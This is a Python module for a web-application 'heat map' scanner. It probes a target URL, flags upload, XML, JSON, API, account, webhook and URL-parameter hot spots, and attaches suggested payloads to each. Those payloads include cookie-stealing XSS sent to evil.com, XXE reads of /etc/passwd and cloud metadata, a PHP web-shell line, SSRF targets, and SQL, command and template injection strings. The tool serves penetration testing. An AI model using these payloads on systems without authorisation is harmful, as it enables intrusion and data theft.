"""
Heat Map Analyzer

Identifies "hot spots" within a target web application — places where
vulnerabilities are most likely to exist — and tells the user exactly what
type of vulnerabilities to test for at each point.

Categories analysed:
  1. Upload Functions      — 3rd-party integrations, XML/doc uploads, image uploads, S3 storage
  2. Content Types         — multipart/form-data, XML, JSON
  3. APIs                  — hidden HTTP methods, lack of auth, versioning
  4. Account Section       — profile pages, custom fields, integrations
  5. Error Handling        — exotic injection vectors, application DoS
  6. URL/Path Parameters   — SSRF, open redirects
"""

import logging
import re
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urljoin, parse_qs

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constant data: category definitions, risk scores, payloads
# ---------------------------------------------------------------------------

HOTSPOT_CATEGORIES = {
    'upload_3rdparty': {
        'label': 'Upload – 3rd Party Integration',
        'vulnerabilities': ['xss'],
        'description': 'File upload endpoints that accept external integrations.',
        'payloads': [
            '"><img src=x onerror=alert(1)>.jpg',
            '<script>alert(document.domain)</script>.png',
        ],
        'base_risk': 6,
        'priority': 'High',
    },
    'upload_xml': {
        'label': 'Upload – XML/Document (DOCX/PDF/SVG)',
        'vulnerabilities': ['ssrf', 'xss', 'xxe'],
        'description': 'Document upload fields accepting .docx, .xlsx, .pdf, .xml, .svg.',
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
    'upload_image': {
        'label': 'Upload – Image',
        'vulnerabilities': ['xss', 'shell_upload', 'metadata_injection'],
        'description': 'Profile pictures, galleries, any image upload. Check filename XSS, polyglot files, EXIF injection.',
        'payloads': [
            '"><img src=x onerror=alert(1)>.png',
            'shell.php.jpg',
            'test.php%00.jpg',
            'GIF89a;<?php system($_GET["cmd"]); ?>',
        ],
        'base_risk': 7,
        'priority': 'High',
    },
    'upload_s3': {
        'label': 'Upload – Data Storage (S3 Permissions)',
        'vulnerabilities': ['s3_misconfiguration', 'info_disclosure'],
        'description': 'Check where uploaded files are stored. Look for public S3 bucket read/write, directory listing.',
        'payloads': [],
        'base_risk': 7,
        'priority': 'High',
    },
    'content_multipart': {
        'label': 'Content Type – multipart/form-data',
        'vulnerabilities': ['shell_upload', 'sqli', 'command_injection', 'path_traversal', 'mime_bypass'],
        'description': 'All multipart/form-data endpoints. Web shell upload, command injection, path traversal via filename.',
        'payloads': [
            '../../../etc/passwd',
            '; id',
            "' OR 1=1--",
            '<script>alert(1)</script>',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
    'content_xml': {
        'label': 'Content Type – application/xml',
        'vulnerabilities': ['xxe', 'ssrf', 'dos'],
        'description': 'Endpoints accepting application/xml or text/xml. XXE, SSRF via XXE, Billion Laughs DoS.',
        'payloads': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host/">]><foo>&xxe;</foo>',
        ],
        'base_risk': 9,
        'priority': 'Critical',
    },
    'content_json': {
        'label': 'Content Type – application/json (API)',
        'vulnerabilities': ['mass_assignment', 'idor', 'broken_auth', 'excessive_data_exposure', 'rate_limiting'],
        'description': 'JSON endpoints. API mass assignment, IDOR, broken authentication, excessive data exposure.',
        'payloads': [
            '{"role":"admin","isAdmin":true}',
            '{"id":1}',
        ],
        'base_risk': 7,
        'priority': 'High',
    },
    'api_endpoints': {
        'label': 'API Endpoints',
        'vulnerabilities': ['hidden_http_methods', 'missing_auth', 'idor', 'api_versioning'],
        'description': 'All /api/ REST and GraphQL endpoints. Hidden HTTP methods, lack of auth, IDOR, versioning issues.',
        'payloads': [
            'OPTIONS, PUT, DELETE, PATCH, TRACE (test all HTTP methods)',
            '/api/v1/, /api/v2/, /api/v0/ (version enumeration)',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
    'account_profile': {
        'label': 'Account – Profile Pages',
        'vulnerabilities': ['stored_xss'],
        'description': 'Display name, bio, about-me, avatar URL fields. Stored XSS.',
        'payloads': [
            '<script>alert(document.cookie)</script>',
            '"><img src=x onerror=fetch("https://evil.com/?c="+document.cookie)>',
            "javascript:alert(1)",
        ],
        'base_risk': 7,
        'priority': 'High',
    },
    'account_custom_fields': {
        'label': 'Account – App Custom Fields',
        'vulnerabilities': ['stored_xss', 'ssti'],
        'description': 'User-configurable custom fields, form builders, custom attributes. Stored XSS and SSTI.',
        'payloads': [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
    'account_integrations': {
        'label': 'Account – Integrations (Webhooks / OAuth)',
        'vulnerabilities': ['ssrf', 'xss'],
        'description': 'Webhook URLs, OAuth callbacks, third-party service configs. SSRF via callback URL, XSS via display names.',
        'payloads': [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1/',
            'http://internal-host.corp/',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
    'error_handling': {
        'label': 'Error Handling',
        'vulnerabilities': ['ssti', 'ldap_injection', 'xpath_injection', 'expression_language_injection', 'dos'],
        'description': 'Trigger errors via malformed input. Exotic injection in error messages, application DoS.',
        'payloads': [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "' OR 1=1--",
            '${Runtime.exec("id")}',
            "a' or 'a'='a",
            'AAAA' * 10000,
        ],
        'base_risk': 6,
        'priority': 'Medium',
    },
    'url_path_params': {
        'label': 'URL/Path Parameters as Values',
        'vulnerabilities': ['ssrf', 'open_redirect'],
        'description': 'Parameters accepting URLs or file paths. SSRF internal network access, open redirects.',
        'payloads': [
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]/',
            'http://0.0.0.0/',
            '//evil.com',
            'https://evil.com',
        ],
        'base_risk': 8,
        'priority': 'Critical',
    },
}

# Patterns used to detect hot spots during page / response analysis
_UPLOAD_EXTENSIONS = re.compile(
    r'\.(docx?|xlsx?|pdf|xml|svg|png|jpe?g|gif|webp|zip|tar|gz)(\b|")',
    re.IGNORECASE,
)
_MULTIPART_PATTERN = re.compile(r'multipart/form-data', re.IGNORECASE)
_XML_CT_PATTERN = re.compile(r'(application/xml|text/xml)', re.IGNORECASE)
_JSON_CT_PATTERN = re.compile(r'application/json', re.IGNORECASE)
_API_PATH_PATTERN = re.compile(r'/api/|/graphql|/rest/', re.IGNORECASE)
_PROFILE_PATTERN = re.compile(r'/(profile|account|user|settings|preferences)', re.IGNORECASE)
_WEBHOOK_PATTERN = re.compile(r'(webhook|callback|redirect_uri|return_url|next|url=|href=)', re.IGNORECASE)
_URL_PARAM_PATTERN = re.compile(r'^(url|redirect|callback|next|returnto|goto|dest|destination|src|source|href)$', re.IGNORECASE)
_XML_DOC_UPLOAD = re.compile(r'(\.xml|\.svg|\.docx|\.xlsx|\.pdf)\b', re.IGNORECASE)
_IMAGE_UPLOAD = re.compile(r'\.(png|jpe?g|gif|webp|bmp|tiff?)\b', re.IGNORECASE)

# HTTP methods to probe for hidden method support
HIDDEN_HTTP_METHODS = ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']


class HotSpot:
    """Represents a single identified hot spot within the target application."""

    def __init__(
        self,
        category: str,
        url: str,
        parameter: Optional[str] = None,
        risk_score: int = 5,
        priority: str = 'Medium',
        vulnerabilities: Optional[List[str]] = None,
        payloads: Optional[List[str]] = None,
        description: str = '',
        evidence: str = '',
    ):
        self.category = category
        self.url = url
        self.parameter = parameter
        self.risk_score = risk_score
        self.priority = priority
        self.vulnerabilities = vulnerabilities or []
        self.payloads = payloads or []
        self.description = description
        self.evidence = evidence

    def to_dict(self) -> Dict[str, Any]:
        return {
            'category': self.category,
            'category_label': HOTSPOT_CATEGORIES.get(self.category, {}).get('label', self.category),
            'url': self.url,
            'parameter': self.parameter,
            'risk_score': self.risk_score,
            'priority': self.priority,
            'vulnerabilities': self.vulnerabilities,
            'payloads': self.payloads,
            'description': self.description,
            'evidence': self.evidence,
        }


class HeatMapAnalyzer:
    """
    Scans a target web application and identifies hot spots — areas where
    vulnerabilities are most likely to exist.

    For each discovered hot spot the analyzer records:
    - The exact URL/endpoint
    - The parameter name (if applicable)
    - The vulnerability types to test for
    - Suggested payloads / test approaches
    - A risk score (1-10) and priority (Critical/High/Medium/Low)
    """

    def __init__(self, timeout: int = 10, verify_ssl: bool = False, max_urls: int = 100):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.max_urls = max_urls
        self._session = None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def analyze(self, target_url: str) -> Dict[str, Any]:
        """
        Run the full heat map analysis against *target_url*.

        Returns a dict with:
            target_url   – the analysed URL
            hotspots     – list of HotSpot dicts
            summary      – density counts per category
            risk_scores  – dict mapping category -> avg risk score
            generated_at – ISO timestamp
        """
        import datetime

        logger.info("HeatMapAnalyzer: starting analysis of %s", target_url)

        hotspots: List[HotSpot] = []

        # Passive analysis from URL structure alone
        hotspots.extend(self._analyze_url(target_url))

        # Active HTTP probing (requires requests library)
        if _HAS_REQUESTS:
            try:
                hotspots.extend(self._probe_target(target_url))
            except Exception as exc:
                logger.warning("HeatMapAnalyzer: HTTP probing failed: %s", exc)

        # Build summary
        summary = self._build_summary(hotspots)

        result = {
            'target_url': target_url,
            'hotspots': [h.to_dict() for h in hotspots],
            'summary': summary,
            'risk_scores': self._risk_scores(hotspots),
            'total_hotspots': len(hotspots),
            'generated_at': datetime.datetime.now(datetime.timezone.utc).isoformat(),
        }

        logger.info(
            "HeatMapAnalyzer: found %d hotspot(s) for %s",
            len(hotspots),
            target_url,
        )
        return result

    def analyze_response(self, url: str, response_text: str, headers: Optional[Dict[str, str]] = None) -> List[HotSpot]:
        """
        Analyse a single HTTP response for hot spots.

        Useful for integrating with the existing scanner pipeline — call this
        method for each response the scanner fetches.
        """
        hotspots: List[HotSpot] = []
        headers = headers or {}

        content_type = ''
        for k, v in headers.items():
            if k.lower() == 'content-type':
                content_type = v
                break

        hotspots.extend(self._check_content_type(url, content_type, response_text))
        hotspots.extend(self._check_upload_forms(url, response_text))
        hotspots.extend(self._check_url_params(url))
        hotspots.extend(self._check_api_pattern(url))
        hotspots.extend(self._check_account_pattern(url, response_text))
        hotspots.extend(self._check_webhook_pattern(url, response_text))

        return hotspots

    # ------------------------------------------------------------------
    # Private analysis helpers
    # ------------------------------------------------------------------

    def _analyze_url(self, url: str) -> List[HotSpot]:
        """Derive hot spots purely from URL structure."""
        hotspots: List[HotSpot] = []
        hotspots.extend(self._check_url_params(url))
        hotspots.extend(self._check_api_pattern(url))
        hotspots.extend(self._check_account_pattern(url, ''))
        return hotspots

    def _probe_target(self, base_url: str) -> List[HotSpot]:
        """Perform active HTTP probing and derive hot spots from responses."""
        import requests as req

        session = req.Session()
        session.verify = self.verify_ssl
        hotspots: List[HotSpot] = []

        try:
            resp = session.get(base_url, timeout=self.timeout, allow_redirects=True)
            headers = dict(resp.headers)
            hotspots.extend(self.analyze_response(base_url, resp.text, headers))

            # Check for hidden HTTP methods on the base URL
            hotspots.extend(self._probe_http_methods(session, base_url))

        except Exception as exc:
            logger.debug("HeatMapAnalyzer: _probe_target exception: %s", exc)

        return hotspots

    def _probe_http_methods(self, session: Any, url: str) -> List[HotSpot]:
        """Test which HTTP methods are accepted by *url*."""
        hotspots: List[HotSpot] = []
        allowed_methods: List[str] = []

        for method in HIDDEN_HTTP_METHODS:
            try:
                resp = session.request(method, url, timeout=self.timeout, allow_redirects=False)
                # 405 Method Not Allowed means server knows the method but rejects it
                # 200, 201, 204, 301, 302, 403 indicate the method is accepted
                if resp.status_code not in (405, 501):
                    allowed_methods.append(f"{method}:{resp.status_code}")
            except Exception:
                pass

        if allowed_methods:
            cat_info = HOTSPOT_CATEGORIES['api_endpoints']
            hotspots.append(HotSpot(
                category='api_endpoints',
                url=url,
                risk_score=cat_info['base_risk'],
                priority=cat_info['priority'],
                vulnerabilities=cat_info['vulnerabilities'],
                payloads=cat_info['payloads'],
                description=cat_info['description'],
                evidence=f"Hidden HTTP methods responded: {', '.join(allowed_methods)}",
            ))

        return hotspots

    def _check_content_type(self, url: str, content_type: str, body: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        if _MULTIPART_PATTERN.search(content_type) or _MULTIPART_PATTERN.search(body):
            cat = HOTSPOT_CATEGORIES['content_multipart']
            hotspots.append(HotSpot(
                category='content_multipart',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"multipart/form-data detected in response",
            ))

        if _XML_CT_PATTERN.search(content_type):
            cat = HOTSPOT_CATEGORIES['content_xml']
            hotspots.append(HotSpot(
                category='content_xml',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"XML content type detected: {content_type}",
            ))

        if _JSON_CT_PATTERN.search(content_type):
            cat = HOTSPOT_CATEGORIES['content_json']
            hotspots.append(HotSpot(
                category='content_json',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"JSON content type detected: {content_type}",
            ))

        return hotspots

    def _check_upload_forms(self, url: str, body: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        # Look for <input type="file"> in response HTML
        has_file_input = bool(re.search(r'<input[^>]+type=["\']?file["\']?', body, re.IGNORECASE))
        if not has_file_input:
            return hotspots

        # Determine upload sub-type from surrounding context
        if _XML_DOC_UPLOAD.search(body):
            cat = HOTSPOT_CATEGORIES['upload_xml']
            hotspots.append(HotSpot(
                category='upload_xml',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="File input accepting XML/document types found in page HTML",
            ))

        if _IMAGE_UPLOAD.search(body):
            cat = HOTSPOT_CATEGORIES['upload_image']
            hotspots.append(HotSpot(
                category='upload_image',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="File input accepting image types found in page HTML",
            ))

        # Generic file upload (3rd-party integration)
        if re.search(r'(integration|connect|import|third.?party)', body, re.IGNORECASE):
            cat = HOTSPOT_CATEGORIES['upload_3rdparty']
            hotspots.append(HotSpot(
                category='upload_3rdparty',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="Third-party integration keyword + file input found in page HTML",
            ))

        # S3 / cloud storage references
        if re.search(r's3\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net', body, re.IGNORECASE):
            cat = HOTSPOT_CATEGORIES['upload_s3']
            hotspots.append(HotSpot(
                category='upload_s3',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="Cloud storage URL found in page HTML",
            ))

        return hotspots

    def _check_url_params(self, url: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        parsed = urlparse(url)
        if not parsed.query:
            return hotspots

        qs = parse_qs(parsed.query, keep_blank_values=True)
        url_like_params = [
            k for k in qs
            if _URL_PARAM_PATTERN.search(k)
        ]

        for param in url_like_params:
            cat = HOTSPOT_CATEGORIES['url_path_params']
            hotspots.append(HotSpot(
                category='url_path_params',
                url=url,
                parameter=param,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"Parameter '{param}' may accept URL/path values",
            ))

        return hotspots

    def _check_api_pattern(self, url: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        if _API_PATH_PATTERN.search(url):
            cat = HOTSPOT_CATEGORIES['api_endpoints']
            hotspots.append(HotSpot(
                category='api_endpoints',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"API path pattern detected in URL: {url}",
            ))

        return hotspots

    def _check_account_pattern(self, url: str, body: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        if _PROFILE_PATTERN.search(url):
            cat = HOTSPOT_CATEGORIES['account_profile']
            hotspots.append(HotSpot(
                category='account_profile',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence=f"Account/profile path detected in URL: {url}",
            ))

        if body and re.search(r'(custom.?field|template|attribute|placeholder)', body, re.IGNORECASE):
            cat = HOTSPOT_CATEGORIES['account_custom_fields']
            hotspots.append(HotSpot(
                category='account_custom_fields',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="Custom field / template keyword found in page HTML",
            ))

        return hotspots

    def _check_webhook_pattern(self, url: str, body: str) -> List[HotSpot]:
        hotspots: List[HotSpot] = []

        if _WEBHOOK_PATTERN.search(url) or (body and _WEBHOOK_PATTERN.search(body)):
            cat = HOTSPOT_CATEGORIES['account_integrations']
            hotspots.append(HotSpot(
                category='account_integrations',
                url=url,
                risk_score=cat['base_risk'],
                priority=cat['priority'],
                vulnerabilities=cat['vulnerabilities'],
                payloads=cat['payloads'],
                description=cat['description'],
                evidence="Webhook/callback URL pattern detected",
            ))

        return hotspots

    # ------------------------------------------------------------------
    # Summary helpers
    # ------------------------------------------------------------------

    def _build_summary(self, hotspots: List[HotSpot]) -> Dict[str, Any]:
        from collections import Counter
        category_counts: Counter = Counter(h.category for h in hotspots)
        priority_counts: Counter = Counter(h.priority for h in hotspots)

        return {
            'by_category': dict(category_counts),
            'by_priority': dict(priority_counts),
            'total': len(hotspots),
        }

    def _risk_scores(self, hotspots: List[HotSpot]) -> Dict[str, float]:
        scores: Dict[str, List[int]] = {}
        for h in hotspots:
            scores.setdefault(h.category, []).append(h.risk_score)

        return {
            cat: round(sum(vals) / len(vals), 1)
            for cat, vals in scores.items()
        }
